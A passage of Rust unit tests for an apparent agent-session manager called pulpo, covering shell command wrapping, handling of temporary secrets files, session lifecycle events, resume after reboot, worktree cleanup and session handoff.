            .expect("failed to spawn shell");

        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            output.status.success(),
            "wrapped command has shell syntax errors:\n  command: {cmd}\n  stderr: {stderr}"
        );
    }

    #[test]
    fn test_wrap_command_with_quotes_executes_without_parse_error() {
        // Same test but with a command containing single quotes (common with claude -p).
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "echo 'hello world'",
            &id,
            "quoted-session",
            None,
            None,
            "/tmp",
        );

        let output = std::process::Command::new("sh")
            .args(["-n", "-c", &cmd])
            .output()
            .expect("failed to spawn shell");

        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(
            output.status.success(),
            "wrapped command with quotes has shell syntax errors:\n  command: {cmd}\n  stderr: {stderr}"
        );
    }

    #[test]
    fn test_is_shell_command() {
        assert!(is_shell_command("bash"));
        assert!(is_shell_command("zsh"));
        assert!(is_shell_command("sh"));
        assert!(is_shell_command("fish"));
        assert!(is_shell_command("nu"));
        assert!(is_shell_command("/bin/bash"));
        assert!(is_shell_command("/usr/bin/zsh"));
        assert!(!is_shell_command("claude"));
        assert!(!is_shell_command("claude -p 'fix'"));
        assert!(!is_shell_command("npm run lint"));
        assert!(!is_shell_command("bash -c 'echo hello'"));
    }

    #[test]
    fn test_wrap_command_shell_no_exit_marker() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("bash", &id, "my-shell", None, None, "/tmp");
        // Bare-shell spawns are NOT exec'd — the wrapper must regain control to
        // write the `.clean` marker after the interactive shell exits.
        assert!(cmd.contains("bash;"));
        assert!(!cmd.contains("exec bash"));
        assert!(cmd.contains(&format!("PULPO_SESSION_ID={id}")));
        assert!(cmd.contains("PULPO_SESSION_NAME=my-shell"));
        // Shell sessions should NOT have the agent-exit hint, nor an exit-code marker
        // (only `.clean` is written on this path).
        assert!(!cmd.contains("[pulpo] Agent exited"));
        assert!(!cmd.contains("Run: pulpo resume"));
        assert!(!cmd.contains(&format!("{id}.code")));
        assert!(cmd.contains(&format!("{id}.clean")));
    }

    #[test]
    fn test_wrap_command_shell_with_path() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("/usr/bin/zsh", &id, "zsh-session", None, None, "/tmp");
        assert!(cmd.contains("/usr/bin/zsh;"));
        assert!(!cmd.contains("exec /usr/bin/zsh"));
        assert!(!cmd.contains("[pulpo] Agent exited"));
    }

    #[test]
    fn test_wrap_command_with_secrets_file() {
        let id = uuid::Uuid::new_v4();
        let secrets_path = "/tmp/pulpo-secrets-test.sh";
        let cmd = wrap_command("echo hello", &id, "test", Some(secrets_path), None, "/tmp");
        // Command should source the secrets file and delete it — NOT contain secret values
        assert!(cmd.contains(". /tmp/pulpo-secrets-test.sh && rm -f /tmp/pulpo-secrets-test.sh"));
        assert!(cmd.contains("echo hello"));
        // Secret values should NOT appear in the command string
        assert!(!cmd.contains("export GITHUB_TOKEN"));
    }

    #[test]
    fn test_wrap_command_shell_with_secrets_file() {
        let id = uuid::Uuid::new_v4();
        let secrets_path = "/tmp/pulpo-secrets-shell.sh";
        let cmd = wrap_command("bash", &id, "my-shell", Some(secrets_path), None, "/tmp");
        assert!(cmd.contains(". /tmp/pulpo-secrets-shell.sh && rm -f /tmp/pulpo-secrets-shell.sh"));
        assert!(cmd.contains("bash;"));
        assert!(!cmd.contains("exec bash"));
    }

    #[test]
    fn test_wrap_command_no_secrets_file() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("echo hello", &id, "test", None, None, "/tmp");
        // Without secrets, no source/rm prefix should appear
        assert!(!cmd.contains(". /tmp/pulpo-secrets"));
        assert!(!cmd.contains("rm -f"));
        assert!(cmd.contains("echo hello"));
    }

    #[test]
    fn test_wrap_command_data_dir_with_spaces_is_escaped_and_parses() {
        // data_dir may contain spaces (e.g. "/Users/dario/My Documents/.pulpo") — the
        // exit-marker directory must be quoted defensively, just like session names.
        let id = uuid::Uuid::new_v4();
        let data_dir = "/tmp/pulpo test dir";
        let cmd = wrap_command("echo hi", &id, "test", None, None, data_dir);
        assert!(cmd.contains(&format!("{id}.code")));
        assert!(cmd.contains(&format!("{id}.clean")));
        assert!(cmd.contains("pulpo test dir"));

        // The whole wrapped command must still parse as valid shell despite the space.
        let output = std::process::Command::new("sh")
            .args(["-n", "-c", &cmd])
            .output()
            .expect("failed to spawn shell");
        assert!(
            output.status.success(),
            "wrapped command with spaced data_dir has shell syntax errors:\n  command: {cmd}\n  stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    #[test]
    fn test_wrap_command_term_program() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("claude", &id, "test-session", None, Some("ghostty"), "/tmp");
        assert!(cmd.contains("export TERM_PROGRAM='ghostty'"));
    }

    #[test]
    fn test_wrap_command_no_term_program() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command("claude", &id, "test-session", None, None, "/tmp");
        assert!(!cmd.contains("TERM_PROGRAM"));
    }

    #[test]
    fn test_write_secrets_file_empty() {
        let tmpdir = tempfile::tempdir().unwrap();
        let id = uuid::Uuid::new_v4();
        let result =
            write_secrets_file(&id, &HashMap::new(), tmpdir.path().to_str().unwrap()).unwrap();
        assert!(result.is_none());
    }

    #[test]
    fn test_write_secrets_file_creates_file() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("GITHUB_TOKEN".to_owned(), "ghp_abc123".to_owned());
        secrets.insert("NPM_TOKEN".to_owned(), "npm_xyz".to_owned());

        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        assert_eq!(path, format!("{data_dir}/secrets/secrets-{id}.sh"));

        // File should exist and contain export statements
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("export GITHUB_TOKEN='ghp_abc123'"));
        assert!(content.contains("export NPM_TOKEN='npm_xyz'"));

        // File should have restrictive permissions (0600) set atomically
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let metadata = std::fs::metadata(&path).unwrap();
            assert_eq!(metadata.permissions().mode() & 0o777, 0o600);
        }
    }

    #[test]
    fn test_write_secrets_file_escapes_single_quotes() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("MY_KEY".to_owned(), "value'with'quotes".to_owned());

        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        assert!(content.contains("export MY_KEY='value'\\''with'\\''quotes'"));
    }

    #[tokio::test]
    async fn test_create_session_with_secrets() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        // Pre-populate secrets
        mgr.store()
            .set_secret("MY_TOKEN", "secret123")
            .await
            .unwrap();
        mgr.store()
            .set_secret_with_env("GH_WORK", "ghp_abc", Some("GITHUB_TOKEN"))
            .await
            .unwrap();

        let mut req = make_req("secret-test");
        req.secrets = Some(vec!["MY_TOKEN".into(), "GH_WORK".into()]);
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.status, SessionStatus::Active);

        let calls = backend.calls.lock().unwrap();
        let create_call = &calls[0];
        // Secrets should NOT appear in the command string (security fix)
        assert!(
            !create_call.contains("secret123"),
            "secret value leaked into command: {create_call}"
        );
        assert!(
            !create_call.contains("ghp_abc"),
            "secret value leaked into command: {create_call}"
        );
        // Instead, the command should source a secrets file from data_dir
        assert!(
            create_call.contains("/secrets/secrets-"),
            "command should source secrets file: {create_call}"
        );
        assert!(
            create_call.contains("&& rm -f"),
            "command should delete secrets file: {create_call}"
        );
        drop(calls);

        // Verify the secrets file was created with correct content in data_dir
        let data_dir = mgr.store().data_dir();
        let secrets_path = format!("{data_dir}/secrets/secrets-{}.sh", session.id);
        let content = std::fs::read_to_string(&secrets_path).unwrap();
        assert!(content.contains("export MY_TOKEN='secret123'"));
        assert!(content.contains("export GITHUB_TOKEN='ghp_abc'"));
    }

    #[tokio::test]
    async fn test_create_session_with_empty_secrets() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let mut req = make_req("empty-secrets");
        req.secrets = Some(vec![]);
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.status, SessionStatus::Active);
    }

    #[tokio::test]
    async fn test_create_session_emits_event() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let _session = mgr.create_session(make_req("event-test")).await.unwrap();

        let event = event_rx.recv().await.unwrap();
        let se = unwrap_session_event(event);
        assert_eq!(se.session_name, "event-test");
        assert_eq!(se.status, "active");
        assert_eq!(se.previous_status.as_deref(), Some("creating"));
        assert_eq!(se.node_name, "test-node");
    }

    #[tokio::test]
    async fn test_stop_session_emits_event() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let session = mgr.create_session(make_req("stop-event")).await.unwrap();
        // Drain the create event
        let _ = event_rx.recv().await;

        mgr.stop_session(&session.id.to_string(), false)
            .await
            .unwrap();
        let event = event_rx.recv().await.unwrap();
        let se = unwrap_session_event(event);
        assert_eq!(se.status, "stopped");
    }

    #[tokio::test]
    async fn test_stop_session_purge_emits_deleted_event() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let (event_tx, mut event_rx) = broadcast::channel(16);
        let mgr = mgr.with_event_tx(event_tx, "test-node".into());
        let session = mgr.create_session(make_req("purge-event")).await.unwrap();
        let _ = event_rx.recv().await;

        mgr.stop_session(&session.id.to_string(), true)
            .await
            .unwrap();

        let stopped = event_rx.recv().await.unwrap();
        let deleted = event_rx.recv().await.unwrap();
        let stopped = unwrap_session_event(stopped);
        assert_eq!(stopped.status, "stopped");
        match deleted {
            PulpoEvent::SessionDeleted(se) => {
                assert_eq!(se.session_id, session.id.to_string());
                assert_eq!(se.session_name, "purge-event");
                assert_eq!(se.node_name, "test-node");
            }
            PulpoEvent::Session(_) | PulpoEvent::UsageAlert(_) | PulpoEvent::Intervention(_) => {
                panic!("expected session_deleted event")
            }
        }
    }

    #[tokio::test]
    async fn test_stop_session_purge_active_succeeds() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let id = session.id.to_string();

        // stop_session with purge handles active sessions fine — stops then purges
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    #[tokio::test]
    async fn test_stop_session_purge_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let result = mgr.stop_session("nonexistent", true).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not found"));
    }

    #[tokio::test]
    async fn test_resolve_backend_id_with_stored() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("test")).await.unwrap();
        let backend_id = mgr.resolve_backend_id(&session);
        // MockBackend.query_backend_id returns $N where N is name length
        assert_eq!(backend_id, "$4");
    }

    #[tokio::test]
    async fn test_resolve_command_no_command_falls_back_to_shell() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            description: Some("desc".into()),
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let resolved = mgr.resolve_command(&req);
        // Falls back to $SHELL or /bin/sh
        assert!(!resolved.command.is_empty());
        assert_eq!(resolved.description, Some("desc".into()));
    }

    #[tokio::test]
    async fn test_create_session_uses_default_command() {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, Some("claude".into())).with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "default-cmd-test".into(),
            workdir: Some("/tmp".into()),
            command: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.command, "claude");
    }

    #[tokio::test]
    async fn test_create_session_explicit_command_overrides_default() {
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new());
        let mgr = SessionManager::new(backend, store, Some("claude".into())).with_no_stale_grace();

        let req = CreateSessionRequest {
            name: "explicit-cmd-test".into(),
            workdir: Some("/tmp".into()),
            command: Some("custom-agent".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.command, "custom-agent");
    }

    #[test]
    fn test_write_secrets_file_path_includes_session_id() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("KEY".to_owned(), "val".to_owned());
        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        assert!(
            path.contains(&id.to_string()),
            "path should contain session ID: {path}"
        );
        assert_eq!(path, format!("{data_dir}/secrets/secrets-{id}.sh"));
    }

    #[test]
    fn test_write_secrets_file_content_format() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("MY_VAR".to_owned(), "hello world".to_owned());
        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        // Each line should be: export KEY='VALUE'
        assert!(content.contains("export MY_VAR='hello world'\n"));
    }

    #[test]
    fn test_write_secrets_file_escapes_multiple_single_quotes() {
        let tmpdir = tempfile::tempdir().unwrap();
        let data_dir = tmpdir.path().to_str().unwrap();
        let id = uuid::Uuid::new_v4();
        let mut secrets = HashMap::new();
        secrets.insert("K".to_owned(), "a'b'c".to_owned());
        let path = write_secrets_file(&id, &secrets, data_dir)
            .unwrap()
            .unwrap();
        let content = std::fs::read_to_string(&path).unwrap();
        // Each ' becomes '\'' in shell single-quote escaping
        assert!(content.contains("export K='a'\\''b'\\''c'"));
    }

    #[test]
    fn test_wrap_command_secrets_source_before_env_vars() {
        let id = uuid::Uuid::new_v4();
        let cmd = wrap_command(
            "echo test",
            &id,
            "sess",
            Some("/tmp/secrets.sh"),
            None,
            "/tmp",
        );
        // The source-and-delete must come BEFORE the env var exports
        let source_pos = cmd.find(". /tmp/secrets.sh").unwrap();
        let env_pos = cmd.find("PULPO_SESSION_ID").unwrap();
        assert!(
            source_pos < env_pos,
            "secrets should be sourced before env vars: {cmd}"
        );
    }

    #[test]
    fn test_wrap_command_secrets_source_and_delete_pattern() {
        let id = uuid::Uuid::new_v4();
        let path = "/tmp/pulpo-secrets-test.sh";
        let cmd = wrap_command("my-agent", &id, "sess", Some(path), None, "/tmp");
        // Pattern: `. <file> && rm -f <file>; `
        assert!(cmd.contains(&format!(". {path} && rm -f {path}; ")));
    }

    #[tokio::test]
    async fn test_create_session_with_missing_secret_names() {
        // Requesting secrets that don't exist in store — should silently skip them
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let mut req = make_req("missing-secrets");
        req.secrets = Some(vec!["NONEXISTENT_SECRET".into()]);
        let session = mgr.create_session(req).await.unwrap();
        assert_eq!(session.status, SessionStatus::Active);
    }

    #[tokio::test]
    async fn test_create_session_secret_env_collision() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        // Set up two secrets that both map to GITHUB_TOKEN
        mgr.store()
            .set_secret("GITHUB_TOKEN", "val1")
            .await
            .unwrap();
        mgr.store()
            .set_secret_with_env("GH_WORK", "val2", Some("GITHUB_TOKEN"))
            .await
            .unwrap();

        let mut req = make_req("collision-test");
        req.secrets = Some(vec!["GITHUB_TOKEN".into(), "GH_WORK".into()]);
        let result = mgr.create_session(req).await;
        let err = result.unwrap_err().to_string();
        assert!(err.contains("both map to env var"), "got: {err}");
    }

    #[tokio::test]
    async fn test_create_session_no_command_no_default_falls_back_to_shell() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "no-fallback".into(),
            workdir: Some("/tmp".into()),
            command: None,
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let session = mgr.create_session(req).await.unwrap();
        // Should fall back to $SHELL or /bin/sh
        assert!(!session.command.is_empty());
        let calls = backend.calls.lock().unwrap();
        assert!(calls[0].contains("-l -c"));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_resumes_active_with_dead_backend() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        // Create a session (backend is alive)
        mgr.create_session(make_req("sess-a")).await.unwrap();

        // Now simulate reboot: backend reports dead
        *backend.alive.lock().unwrap() = false;

        // Build a new manager that uses the same store but with dead backend
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 1);

        // Backend should have received a create call for the resumed session
        // 2 create calls: one from original create_session, one from resume
        let resume_creates = backend
            .calls
            .lock()
            .unwrap()
            .iter()
            .filter(|c| c.starts_with("create:"))
            .count();
        assert_eq!(resume_creates, 2);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_skips_stopped_sessions() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("stopped-sess")).await.unwrap();
        mgr.stop_session("stopped-sess", false).await.unwrap();

        *backend.alive.lock().unwrap() = false;
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_skips_alive_sessions() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("alive-sess")).await.unwrap();

        // Backend is alive — should not resume
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_resumes_idle_sessions() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("idle-sess")).await.unwrap();

        // Manually set to Idle (simulates watchdog marking it idle before reboot)
        mgr.store()
            .update_session_status(&session.id.to_string(), SessionStatus::Idle)
            .await
            .unwrap();

        *backend.alive.lock().unwrap() = false;
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 1);

        // Simulate the resumed session being alive now
        *backend.alive.lock().unwrap() = true;

        // Session should be Active again
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Active);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_marks_lost_on_backend_failure() {
        let (mgr, _, _pool) =
            test_manager(MockBackend::new().with_alive(false).with_create_error()).await;
        // Force-insert a session that looks active but backend will fail on resume
        let session = Session {
            id: Uuid::new_v4(),
            name: "fail-resume".into(),
            workdir: "/tmp".into(),
            command: "echo hello".into(),
            status: SessionStatus::Active,
            backend_session_id: Some("fail-resume".into()),
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);

        // Session should be marked Lost (not Active)
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(fetched.status, SessionStatus::Lost);
    }

    #[tokio::test]
    async fn test_resume_lost_sessions_returns_zero_when_empty() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let resumed = mgr.resume_lost_sessions().await.unwrap();
        assert_eq!(resumed, 0);
    }

    #[tokio::test]
    async fn test_create_session_invalid_workdir() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let req = CreateSessionRequest {
            name: "bad-dir".to_owned(),
            workdir: Some("/nonexistent/path/that/does/not/exist".into()),
            command: Some("echo hi".into()),
            description: None,
            metadata: None,
            idle_threshold_secs: None,
            worktree: None,
            worktree_base: None,
            runtime: None,
            secrets: None,
            term_program: None,
            budget_cost_usd: None,
        };
        let err = mgr.create_session(req).await.unwrap_err();
        assert!(
            err.to_string().contains("working directory does not exist"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn test_create_session_docker_runtime_rejected() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        let mut req = make_req("docker-rejected");
        req.runtime = Some(Runtime::Docker);
        let err = mgr.create_session(req).await.unwrap_err();
        assert!(
            err.to_string().contains("docker runtime was removed"),
            "{err}"
        );
        // The backend must never be asked to create anything
        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
        drop(calls);
    }

    #[tokio::test]
    async fn test_resume_session_invalid_workdir() {
        let (mgr, _, pool) = test_manager(MockBackend::new().with_alive(false)).await;
        let session = mgr
            .create_session(make_req("resume-bad-dir"))
            .await
            .unwrap();
        let id = session.id.to_string();
        // Mark as lost and set workdir to nonexistent path
        sqlx::query("UPDATE sessions SET status = 'lost', workdir = ? WHERE id = ?")
            .bind("/nonexistent/path/that/does/not/exist")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        let err = mgr.resume_session(&id).await.unwrap_err();
        assert!(
            err.to_string().contains("working directory does not exist"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn test_resume_session_docker_runtime_rejected() {
        let (mgr, backend, _pool) = test_manager(MockBackend::new()).await;
        // Force-insert a historical docker-runtime session (cannot be created anymore)
        let session = Session {
            id: Uuid::new_v4(),
            name: "old-docker".into(),
            workdir: "/tmp".into(),
            command: "claude".into(),
            status: SessionStatus::Lost,
            backend_session_id: Some("docker:pulpo-old-docker".into()),
            runtime: Runtime::Docker,
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let err = mgr
            .resume_session(&session.id.to_string())
            .await
            .unwrap_err();
        assert!(
            err.to_string().contains("docker runtime was removed"),
            "{err}"
        );
        let calls = backend.calls.lock().unwrap();
        assert!(!calls.iter().any(|c| c.starts_with("create:")));
        drop(calls);
    }

    #[tokio::test]
    async fn test_list_sessions_includes_historical_docker_sessions() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        // Historical rows stored with runtime = "docker" must still list
        let session = Session {
            id: Uuid::new_v4(),
            name: "old-docker-row".into(),
            workdir: "/tmp".into(),
            command: "claude".into(),
            status: SessionStatus::Stopped,
            backend_session_id: Some("docker:pulpo-old-docker-row".into()),
            runtime: Runtime::Docker,
            created_at: Utc::now() - chrono::Duration::hours(1),
            ..Default::default()
        };
        mgr.store().insert_session(&session).await.unwrap();

        let sessions = mgr.list_sessions().await.unwrap();
        let listed = sessions
            .iter()
            .find(|s| s.name == "old-docker-row")
            .unwrap();
        assert_eq!(listed.runtime, Runtime::Docker);
        assert_eq!(listed.status, SessionStatus::Stopped);
    }

    #[test]
    fn test_validate_runtime_tmux_ok_docker_rejected() {
        assert!(validate_runtime(Runtime::Tmux).is_ok());
        let err = validate_runtime(Runtime::Docker).unwrap_err();
        assert!(
            err.to_string()
                .contains("the docker runtime was removed; sessions run in tmux"),
            "{err}"
        );
    }

    #[tokio::test]
    async fn test_stale_grace_period_prevents_early_marking() {
        // Use default stale_grace_secs (5) — don't use with_no_stale_grace
        let tmpdir = tempfile::tempdir().unwrap();
        let tmpdir = Box::leak(Box::new(tmpdir));
        let store = Store::new(tmpdir.path().to_str().unwrap()).await.unwrap();
        store.migrate().await.unwrap();
        let backend = Arc::new(MockBackend::new().with_alive(false));
        let mgr = SessionManager::new(backend, store, None);

        let session = mgr.create_session(make_req("young")).await.unwrap();
        // Session was just created — within grace period, so check_and_mark_stale returns false
        let fetched = mgr
            .get_session(&session.id.to_string())
            .await
            .unwrap()
            .unwrap();
        // Status should remain Active despite backend being dead (grace period)
        assert_eq!(fetched.status, SessionStatus::Active);
    }

    #[test]
    fn test_cleanup_worktree_nonexistent_path() {
        // Should not panic on nonexistent path
        cleanup_worktree("/tmp/nonexistent-worktree-path-for-test", "/tmp");
    }

    #[test]
    fn test_cleanup_worktree_existing_path() {
        // Create a temporary directory structure simulating ~/.pulpo/worktrees/session
        let tmpdir = tempfile::tempdir().unwrap();
        let wt_path = tmpdir
            .path()
            .join(".pulpo")
            .join("worktrees")
            .join("test-session");
        std::fs::create_dir_all(&wt_path).unwrap();
        let wt_str = wt_path.to_str().unwrap();
        assert!(wt_path.exists());
        // repo_dir doesn't need to be a real git repo for this test — prune is best-effort
        cleanup_worktree(wt_str, "/tmp");
        // The worktree directory should be removed
        assert!(!wt_path.exists());
    }

    #[tokio::test]
    async fn test_stop_session_with_worktree() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("wt-stop")).await.unwrap();
        let id = session.id.to_string();
        // Simulate a session with a worktree path (nonexistent — cleanup is best-effort)
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind("/tmp/nonexistent-wt-stop-test")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        // Stop should succeed even with a worktree path
        mgr.stop_session(&id, false).await.unwrap();
    }

    #[tokio::test]
    async fn test_stop_session_purge_with_worktree() {
        let (mgr, _, pool) = test_manager(MockBackend::new()).await;
        let session = mgr.create_session(make_req("wt-purge")).await.unwrap();
        let id = session.id.to_string();
        // Simulate a session with a worktree path (nonexistent — cleanup is best-effort)
        sqlx::query("UPDATE sessions SET worktree_path = ? WHERE id = ?")
            .bind("/tmp/nonexistent-wt-purge-test")
            .bind(&id)
            .execute(&pool)
            .await
            .unwrap();
        // Stop with purge should stop, clean up worktree, and delete from DB
        mgr.stop_session(&id, true).await.unwrap();
        let fetched = mgr.get_session(&id).await.unwrap();
        assert!(fetched.is_none());
    }

    // -- Handoff tests --

    fn make_handoff_req() -> HandoffSessionRequest {
        HandoffSessionRequest {
            name: None,
            command: None,
            description: None,
            secrets: None,
            budget_cost_usd: None,
            idle_threshold_secs: None,
            term_program: None,
        }
    }

    #[tokio::test]
    async fn test_handoff_session_not_found() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let err = mgr
            .handoff_session("nonexistent", make_handoff_req())
            .await
            .unwrap_err();
        assert!(err.to_string().contains("session not found"), "got: {err}");
    }

    #[tokio::test]
    async fn test_handoff_session_auto_name_no_worktree() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), make_handoff_req())
            .await
            .unwrap();

        assert_eq!(handed_off.name, "plan-auth-2");
        assert_eq!(handed_off.workdir, source.workdir);
        assert!(handed_off.worktree_path.is_none());
    }

    #[tokio::test]
    async fn test_handoff_session_auto_name_skips_existing() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        mgr.create_session(make_req("plan-auth-2")).await.unwrap();

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), make_handoff_req())
            .await
            .unwrap();

        assert_eq!(handed_off.name, "plan-auth-3");
    }

    #[tokio::test]
    async fn test_handoff_session_explicit_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        let req = HandoffSessionRequest {
            name: Some("implement-auth".into()),
            ..make_handoff_req()
        };

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), req)
            .await
            .unwrap();

        assert_eq!(handed_off.name, "implement-auth");
    }

    #[tokio::test]
    async fn test_handoff_session_by_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        mgr.create_session(make_req("plan-auth")).await.unwrap();

        // Resolves the source by name, same as get_session.
        let handed_off = mgr
            .handoff_session("plan-auth", make_handoff_req())
            .await
            .unwrap();

        assert_eq!(handed_off.name, "plan-auth-2");
    }

    #[tokio::test]
    async fn test_handoff_session_invalid_explicit_name() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        let req = HandoffSessionRequest {
            name: Some("Bad Name".into()),
            ..make_handoff_req()
        };

        let err = mgr
            .handoff_session(&source.id.to_string(), req)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("lowercase"), "got: {err}");
    }

    #[tokio::test]
    async fn test_handoff_session_passes_through_fields() {
        let (mgr, _, _pool) = test_manager(MockBackend::new()).await;
        let source = mgr.create_session(make_req("plan-auth")).await.unwrap();
        let req = HandoffSessionRequest {
            command: Some("codex 'implement PLAN.md'".into()),
            description: Some("Implement the plan".into()),
            idle_threshold_secs: Some(120),
            budget_cost_usd: Some(3.5),
            ..make_handoff_req()
        };

        let handed_off = mgr
            .handoff_session(&source.id.to_string(), req)
            .await
            .unwrap();

